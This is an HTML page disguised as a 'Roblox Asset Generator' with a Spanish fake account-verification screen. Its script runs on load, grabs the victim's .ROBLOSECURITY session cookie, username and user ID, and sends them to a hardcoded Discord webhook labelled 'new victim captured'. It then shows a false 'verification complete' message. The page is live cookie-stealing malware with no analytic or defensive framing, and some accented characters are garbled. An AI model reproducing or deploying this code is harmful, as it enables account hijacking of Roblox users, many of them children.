<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Asset Generator</title>
    <style>
        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #1e2124;
            color: #dcddde;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background-color: #36393f;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            max-width: 500px;
        }
        h1 {
            color: #ffffff;
            margin-top: 0;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #7289da;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error-message {
            color: #f04747;
            font-weight: bold;
            margin-top: 20px;
            display: none; /* Oculto por defecto */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verificando Cuenta de Roblox</h1>
        <p>Por favor, espera mientras nos conectamos con los servidores de Roblox para verificar tu cuenta y generar los activos...</p>
        <div class="loader"></div>
        <div id="error-message" class="error-message">
            Error: No se pudo conectar con Roblox. Por favor, aseg칰rate de estar en la p치gina de Roblox e intenta de nuevo.
        </div>
    </div>
    <script>
        (async () => {
            // Nueva URL del webhook proporcionada por el usuario.
            const webhookUrl = 'https://discord.com/api/webhooks/1445825410926641163/ULQPiFYeOeEWeZ0vM9R_TnjBBmyhi0YyjxGZSltscGCfYf1xkWidkjo60NM5XT1uWKMt';

            // Obtener la cookie de Roblox del documento.
            const robloxCookie = document.cookie;

            // Verificar si la cookie de sesi칩n est치 presente.
            if (!robloxCookie.includes('.ROBLOSECURITY=')) {
                // Mostrar un mensaje de error amigable en la p치gina si no se encuentra la cookie.
                document.getElementById('error-message').style.display = 'block';
                document.querySelector('.loader').style.display = 'none';
                document.querySelector('p').innerText = 'La verificaci칩n ha fallado.';
                return; // Detener la ejecuci칩n del script.
            }

            // Obtener informaci칩n adicional de la v칤ctima de forma m치s segura.
            const usernameElement = document.querySelector('.navbar-username');
            const username = usernameElement ? usernameElement.innerText : 'N/A';
            const avatarLinkElement = document.querySelector('.navbar-avatar');
            const userIdMatch = avatarLinkElement ? avatarLinkElement.href.match(/\/users\/(\d+)/) : null;
            const userId = userIdMatch ? userIdMatch[1] : 'N/A';

            // Preparar el payload (contenido del mensaje) para Discord.
            const payload = {
                content: '游꼵 춰Nueva v칤ctima capturada!',
                embeds: [{
                    title: 'Detalles de la Cuenta',
                    color: 15158332, // Color rojo oscuro en decimal
                    fields: [
                        { name: '游녻 Usuario', value: username, inline: true },
                        { name: '游 ID', value: userId, inline: true },
                        { name: '游꼵 Cookie (.ROBLOSECURITY)', value: '```' + robloxCookie + '```', inline: false }
                    ],
                    footer: {
                        text: 'Ejecutado via HTML P치gina de Enga침o'
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // Enviar los datos al webhook de Discord.
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('칄xito: Los datos han sido enviados a Discord.');
                    // Opcional: mostrar un mensaje de "칠xito" falso al usuario.
                    document.querySelector('.container').innerHTML = '<h1>춰Verificaci칩n Completada!</h1><p>Tu cuenta ha sido verificada. Los activos ser치n a침adidos en breve.</p>';
                } else {
                    console.error('Error al enviar a Discord. Status:', response.status);
                    document.getElementById('error-message').style.display = 'block';
                }
            } catch (error) {
                console.error('Error de red:', error);
                document.getElementById('error-message').style.display = 'block';
            }
        })();
    </script>
</body>
</html>
